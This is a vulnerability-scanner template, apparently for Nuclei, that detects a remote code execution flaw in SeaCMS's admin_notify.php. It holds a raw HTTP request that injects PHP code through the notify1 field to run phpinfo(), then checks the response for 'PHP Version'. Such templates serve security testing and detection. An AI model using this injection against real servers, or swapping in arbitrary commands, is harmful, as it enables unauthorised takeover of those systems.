id: Seacms-admin-rce
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 海洋CMS影视管理系统admin_notify.php接口存在远程代码执行漏洞，未经授权攻击者可通过该漏洞获取服务器权限。
  reference:
    - https://github.com/wy876/POC/blob/1ff8a0f8154bdaf1dbf0148f25af1d2d38d24f96/%E6%B5%B7%E6%B4%8BCMS-admin_notify.php%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /SeaCMS_12.9/Upload/pwh4pc/admin_notify.php?action=set HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 44

        notify1=1";phpinfo();;//&notify2=2&notify3=3
    matchers:
      - type: word
        part: body
        words:
          - 'PHP Version'
